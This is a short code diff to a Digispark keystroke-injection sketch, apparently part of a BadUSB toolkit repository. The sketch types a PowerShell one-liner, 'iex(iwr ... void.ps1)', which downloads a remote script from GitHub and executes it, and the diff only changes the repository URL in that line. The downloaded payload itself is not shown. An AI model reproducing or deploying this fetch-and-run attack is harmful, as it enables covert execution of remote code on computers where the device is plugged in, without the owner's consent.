@@ -16,7 +16,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
-  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/Esther7171/DigiStrike/main/scripts/void.ps1' -UseBasicParsing).Content");
+  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/Esther7171/Digispark-HID-Toolkit/main/scripts/void.ps1' -UseBasicParsing).Content");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(15000);
 
